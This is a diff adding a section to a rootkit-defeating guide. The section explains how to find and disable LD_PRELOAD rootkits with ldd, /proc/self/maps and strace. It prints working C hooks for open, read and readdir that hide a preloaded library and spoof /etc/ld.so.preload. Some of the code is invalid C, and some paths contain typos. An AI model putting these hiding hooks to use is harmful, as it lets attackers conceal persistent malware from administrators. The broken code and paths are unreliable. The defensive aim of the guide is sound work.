@@ -1,4 +1,3 @@
-
 **********************************************************
 * Defeating ftrace based LKM rootkits for fun and profit *
 **********************************************************
@@ -110,3 +109,348 @@ If you suspect a kprobes based rootkit, you can disable kprobes using
 # echo 0 | sudo tee /sys/kernel/debug/kprobes/enabled
 
 This will immediately disarm any kprobe running on your system. This will also allow you to investigate further.
+
+*****************************************************************************
+* What about LD_PRELOAD rootkits? Is it possible to detect and remove them? *
+******************************************************************************
+
+The obvious place to look for LD_PRELOAD rootkits is in /etc/ld.so.preload. Although the shared libraries could be loaded through .bashrc. In most cases though, you could identify the shared librry by simply looking for the entry in /etc/ld.so.preload. The problem here is that the call to read /etc/ld.so.preload can be intercepted and redirected to say, a blank dummy file making it look as though there is nothing in /et/cld.so.preload. The c  code below will do just that. It intercepts a call to say /etc/ld.so.preload and redirects to the dummy file. The dummy file must be created first. Once that is done,a command such as cat /etc/ld.so.preload will be intercepted and redirceted to the blank dummy file. IN this way, it appears there is no shared libraries being loaded by the ld preloader.
+
+# sudo touch /etc/ld.so.preload.dummy
+
+/* redirect.c*/
+
+#define _GNU_SOURCE
+#include <fcntl.h>
+#include <stdarg.h>
+#include <dlfcn.h>
+#include <string.h>
+
+PRELOAD_PATH="/etc/ld.so.preload"
+DUMMY _PRELOAD="/etc/ld.so.preload/dummy"
+
+extern __thread int inside_hook;
+
+int open(const char *pathname, int flags, ...) {
+    static int (*orig_open)(const char*, int, mode_t) = NULL;
+    if (!orig_open) orig_open = dlsym(RTLD_NEXT, "open");
+
+    mode_t mode = 0;
+    if (flags & O_CREAT) {
+        va_list args;
+        va_start(args, flags);
+        mode = va_arg(args, mode_t);
+        va_end(args);
+    }
+
+    if (inside_hook) return orig_open(pathname, flags, mode);
+
+    if (pathname && strcmp(pathname, PRELOAD_PATH) == 0) {
+        return orig_open(DUMMY_PRELOAD, flags, mode);
+    }
+    return orig_open(pathname, flags, mode);
+}
+
+int open64(const char *pathname, int flags, ...) {
+    static int (*orig_open64)(const char*, int, mode_t) = NULL;
+    if (!orig_open64) orig_open64 = dlsym(RTLD_NEXT, "open64");
+
+    mode_t mode = 0;
+    if (flags & O_CREAT) {
+        va_list args;
+        va_start(args, flags);
+        mode = va_arg(args, mode_t);
+        va_end(args);
+    }
+
+    if (inside_hook) return orig_open64(pathname, flags, mode);
+
+    if (pathname && strcmp(pathname, PRELOAD_PATH) == 0) {
+        return orig_open64(DUMMY_PRELOAD, flags, mode);
+    }
+    return orig_open64(pathname, flags, mode);
+}
+
+int openat(int dirfd, const char *pathname, int flags, ...) {
+    static int (*orig_openat)(int, const char*, int, mode_t) = NULL;
+    if (!orig_openat) orig_openat = dlsym(RTLD_NEXT, "openat");
+
+    mode_t mode = 0;
+    if (flags & O_CREAT) {
+        va_list args;
+        va_start(args, flags);
+        mode = va_arg(args, mode_t);
+        va_end(args);
+    }
+
+    if (inside_hook) return orig_openat(dirfd, pathname, flags, mode);
+
+    if (pathname && strcmp(pathname, PRELOAD_PATH) == 0) {
+        return orig_openat(dirfd, DUMMY_PRELOAD, flags, mode);
+    }
+    return orig_openat(dirfd, pathname, flags, mode);
+}
+
+So then, how can we find and identify the preloaded shared library?
+
+Well, there are a couple places we could look. One being ldd and the other being a virtual memory map. If we call ldd using
+
+# ldd /usr/bin/lsof
+
+we should see the following
+
+marc@archlinux:$ ldd /usr/bin/lsof
+	linux-vdso.so.1 (0x00007f59a0d6a000)
+	--> /usr/local/lib/libhide.so.2 (0x00007f59a0d2d000)
+	libtirpc.so.3 => /usr/lib/libtirpc.so.3 (0x00007f59a0cf7000)
+	libc.so.6 => /usr/lib/libc.so.6 (0x00007f59a0b06000)
+	libgssapi_krb5.so.2 => /usr/lib/libgssapi_krb5.so.2 (0x00007f59a0ab3000)
+	/lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007f59a0d6c000)
+	libkrb5.so.3 => /usr/lib/libkrb5.so.3 (0x00007f59a09ed000)
+	libk5crypto.so.3 => /usr/lib/libk5crypto.so.3 (0x00007f59a09c0000)
+	libcom_err.so.2 => /usr/lib/libcom_err.so.2 (0x00007f59a09b8000)
+	libkrb5support.so.0 => /usr/lib/libkrb5support.so.0 (0x00007f59a09aa000)
+	libkeyutils.so.1 => /usr/lib/libkeyutils.so.1 (0x00007f59a09a3000)
+	libresolv.so.2 => /usr/lib/libresolv.so.2 (0x00007f59a0991000)
+
+We can see now that libhide.so.2 is a dependency. So we can tell from the results that the shared library libhide.so.2 is being preloaded, despie the fact that /etc/ld.so.preload shows no entries and we've checked .bashrc.
+In addition, we can also check virtual memory using
+
+# cat /proc/self/maps
+
+Which would return the following
+
+marc@archlinux:$ cat /proc/self/maps
+55ac55b8a000-55ac55b8c000 r--p 00000000 00:19 18090                      /usr/bin/cat
+55ac55b8c000-55ac55b92000 r-xp 00002000 00:19 18090                      /usr/bin/cat
+55ac55b92000-55ac55b95000 r--p 00008000 00:19 18090                      /usr/bin/cat
+55ac55b95000-55ac55b96000 r--p 0000a000 00:19 18090                      /usr/bin/cat
+55ac55b96000-55ac55b97000 rw-p 0000b000 00:19 18090                      /usr/bin/cat
+55ac9380a000-55ac9382b000 rw-p 00000000 00:00 0                          [heap]
+7f4596e00000-7f45970ed000 r--p 00000000 00:19 108278                     /usr/lib/locale/locale-archive
+7f4597209000-7f459724e000 rw-p 00000000 00:00 0 
+7f459724e000-7f4597272000 r--p 00000000 00:19 3804                       /usr/lib/libc.so.6
+7f4597272000-7f45973e3000 r-xp 00024000 00:19 3804                       /usr/lib/libc.so.6
+7f45973e3000-7f4597431000 r--p 00195000 00:19 3804                       /usr/lib/libc.so.6
+7f4597431000-7f4597435000 r--p 001e2000 00:19 3804                       /usr/lib/libc.so.6
+7f4597435000-7f4597437000 rw-p 001e6000 00:19 3804                       /usr/lib/libc.so.6
+7f4597437000-7f459743f000 rw-p 00000000 00:00 0 
+7f4597447000-7f4597448000 r--p 00000000 00:19 170712                     /usr/local/lib/libhide.so.2
+7f4597448000-7f4597449000 r-xp 00001000 00:19 170712                     /usr/local/lib/libhide.so.2
+7f4597449000-7f459744a000 r--p 00002000 00:19 170712                     /usr/local/lib/libhide.so.2
+7f459744a000-7f459744b000 r--p 00002000 00:19 170712                     /usr/local/lib/libhide.so.2
+7f459744b000-7f459744c000 rw-p 00003000 00:19 170712                     /usr/local/lib/libhide.so.2
+7f459744c000-7f459744e000 rw-p 00000000 00:00 0 
+7f459744f000-7f4597453000 r--p 00000000 00:00 0                          [vvar]
+7f4597453000-7f4597455000 r--p 00000000 00:00 0                          [vvar_vclock]
+7f4597455000-7f4597457000 r-xp 00000000 00:00 0                          [vdso]
+7f4597457000-7f4597458000 r--p 00000000 00:19 3795                       /usr/lib/ld-linux-x86-64.so.2
+7f4597458000-7f4597482000 r-xp 00001000 00:19 3795                       /usr/lib/ld-linux-x86-64.so.2
+7f4597482000-7f459748d000 r--p 0002b000 00:19 3795                       /usr/lib/ld-linux-x86-64.so.2
+7f459748d000-7f459748f000 r--p 00036000 00:19 3795                       /usr/lib/ld-linux-x86-64.so.2
+7f459748f000-7f4597490000 rw-p 00038000 00:19 3795                       /usr/lib/ld-linux-x86-64.so.2
+7f4597490000-7f4597491000 rw-p 00000000 00:00 0 
+7ffd8784a000-7ffd8786b000 rw-p 00000000 00:00 0                          [stack]
+ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
+
+It is clear from the results, that the shared library libhide.so.2 is being preloaded and resides in virtual memory.The problem here is, it is trivial to hide this information. If one were to compile the following into the
+libhide.so.2 code, neither ldd nor /proc/self/maps would show the shared library libhide.so.2
+
+/* libhide.c */
+#define _GNU_SOURCE
+#include <dlfcn.h>
+#include <string.h>
+#include <unistd.h>
+
+ssize_t read(int fd, void *buf, size_t count) {
+    ssize_t (*real_read)(int, void *, size_t) = dlsym(RTLD_NEXT, "read");
+    ssize_t result = real_read(fd, buf, count);
+
+    if (result > 0) {
+        char *start = (char *)buf;
+        char *match;
+
+        size_t remaining = result;
+
+        while ((match = memmem(start, remaining, "libhide.so.2", 12)) != NULL) {
+            char *buffer_root = (char *)buf;
+            char *buffer_end = buffer_root + result;
+
+            char *line_start = memrchr(buffer_root, '\n', match - buffer_root);
+            line_start = line_start ? line_start + 1 : buffer_root;
+
+            char *line_end = memchr(match, '\n', buffer_end - match);
+            line_end = line_end ? line_end + 1 : buffer_end;
+
+            size_t line_len = line_end - line_start;
+
+            // Shift the remaining data forward
+            memmove(line_start, line_end, buffer_end - line_end);
+
+            // Update the global result size
+            result -= line_len;
+
+            // Move the scanning pointer forward to the modification point
+            start = line_start;
+            remaining = buffer_end - line_end;
+        }
+    }
+    return result;
+}
+
+So...if we the call to read /etc/ld.so.preload can be intercepted and redirected and thw library can be hidden from virtual memory, how then can we identify and disable the shared library? And strace comes to the rescue.
+Bu tracing the call to read /etc/ld.so.preload, we can find out a couple importnat things. One, we can find and identify the shared library itself as well as the interception and redirection to the blank dummy file.
+
+# strace cat /etc/ld.so.preload
+
+The results are very telling. The first line of the results that is pertinent, which identifies libhide.so.2 as being accessed early on looks like the following
+
+openat(AT_FDCWD, "/usr/local/lib/libhide.so.2", O_RDONLY|O_CLOEXEC) = 6
+
+The second line which is noteworthy looks like this
+
+openat(AT_FDCWD, "/etc/ld.so.preload.dummy", O_RDONLY) = 6
+
+So, this tells us two things. First, when we try to read /etc/ld.so.preload, a shared library at /usr/local/lib/libhide.so.2 is being accessed as well as second, a dummy file is being opened instead of the real file. But if we look at the directory listing for /usr/local/lib/, it shows us nothign byt the name of libhide.so.2 resides there. THat is becayuse of the following code which hides the shared library from tools like ls.
+
+/* hidelib.c */
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <string.h>
+#include <dirent.h>
+#include <fcntl.h>
+#include <stdarg.h>
+#include <dlfcn.h>
+#include <sys/types.h>
+
+#define LIB_TO_HIDE "libhide.so.2"
+
+// Thread-local guard to prevent infinite recursion loop within hooks
+__thread int inside_hook = 0; 
+
+// Evaluates if a given directory entry matches the library file we want to hide
+static int should_hide_file(const char *name) {
+    if (!name) return 0;
+    return (strcmp(name, LIB_TO_HIDE) == 0);
+}
+
+struct dirent *readdir(DIR *dirp) {
+    static struct dirent* (*orig)(DIR*) = NULL;
+    if (!orig) orig = dlsym(RTLD_NEXT, "readdir");
+
+    if (inside_hook) return orig(dirp);
+
+    inside_hook = 1;
+    struct dirent *e;
+    while ((e = orig(dirp))) {
+        if (should_hide_file(e->d_name)) continue; // Skip if it matches libhide.so.2
+        inside_hook = 0;
+        return e;
+    }
+    inside_hook = 0;
+    return NULL;
+}
+
+struct dirent64 *readdir64(DIR *dirp) {
+    static struct dirent64* (*orig)(DIR*) = NULL;
+    if (!orig) orig = dlsym(RTLD_NEXT, "readdir64");
+
+    if (inside_hook) return orig(dirp);
+
+    inside_hook = 1;
+    struct dirent64 *e;
+    while ((e = orig(dirp))) {
+        if (should_hide_file(e->d_name)) continue; // Skip if it matches libhide.so.2
+        inside_hook = 0;
+        return e;
+    }
+    inside_hook = 0;
+    return NULL;
+}
+
+#pragma GCC diagnostic push
+#pragma GCC diagnostic ignored "-Wdeprecated-declarations"
+int readdir_r(DIR *dirp, struct dirent *entry, struct dirent **result) {
+    static int (*orig)(DIR*, struct dirent*, struct dirent**) = NULL;
+    if (!orig) orig = dlsym(RTLD_NEXT, "readdir_r");
+
+    if (inside_hook) return orig(dirp, entry, result);
+
+    inside_hook = 1;
+    int ret = orig(dirp, entry, result);
+    if (ret == 0 && *result != NULL) {
+        if (should_hide_file((*result)->d_name)) {
+            inside_hook = 0;
+            return readdir_r(dirp, entry, result); // Recurse to get next clean entry
+        }
+    }
+    inside_hook = 0;
+    return ret;
+}
+#pragma GCC diagnostic pop
+
+int open(const char *pathname, int flags, ...) {
+    static int (*orig_open)(const char*, int, mode_t) = NULL;
+    if (!orig_open) orig_open = dlsym(RTLD_NEXT, "open");
+
+    mode_t mode = 0;
+    if (flags & O_CREAT) {
+        va_list args;
+        va_start(args, flags);
+        mode = va_arg(args, mode_t);
+        va_end(args);
+    }
+
+    if (inside_hook) return orig_open(pathname, flags, mode);
+
+    // If something tries to target the library directly, spoof the path
+    if (pathname && strstr(pathname, LIB_TO_HIDE)) return orig_open("/dev/null", flags, mode);
+    return orig_open(pathname, flags, mode);
+}
+
+int open64(const char *pathname, int flags, ...) {
+    static int (*orig_open64)(const char*, int, mode_t) = NULL;
+    if (!orig_open64) orig_open64 = dlsym(RTLD_NEXT, "open64");
+
+    mode_t mode = 0;
+    if (flags & O_CREAT) {
+        va_list args;
+        va_start(args, flags);
+        mode = va_arg(args, mode_t);
+        va_end(args);
+    }
+
+    if (inside_hook) return orig_open64(pathname, flags, mode);
+
+    if (pathname && strstr(pathname, LIB_TO_HIDE)) return orig_open64("/dev/null", flags, mode);
+    return orig_open64(pathname, flags, mode);
+}
+
+int openat(int dirfd, const char *pathname, int flags, ...) {
+    static int (*orig_openat)(int, const char*, int, mode_t) = NULL;
+    if (!orig_openat) orig_openat = dlsym(RTLD_NEXT, "openat");
+
+    mode_t mode = 0;
+    if (flags & O_CREAT) {
+        va_list args;
+        va_start(args, flags);
+        mode = va_arg(args, mode_t);
+        va_end(args);
+    }
+
+    if (inside_hook) return orig_openat(dirfd, pathname, flags, mode);
+
+    if (pathname && strstr(pathname, LIB_TO_HIDE)) return orig_openat(dirfd, "/dev/null", flags, mode);
+    return orig_openat(dirfd, pathname, flags, mode);
+}
+
+However, a shown earlier, using starce leaves nowhere to hide. Now that we know the name of the shared libarary, that is doing the hiding and intercepting is named libhide.so.2 in the /usr/local/lib/ directory,w e can simply rename
+the file and then open the real /etc/ld.so.preload and remove the shared library from being preloaded.
+
+# sudo mv /usr/local/lib/libhide/so.2 /usr/local/lib/libhide.so.2.disabled
+
+One last thing. if you have colored text that is really annoying when you use starce, you can disable colors like this
+
+# strace --color=never cat /etc/ld/so.preload
+
+This works in strace version 7.0, but not earlier.
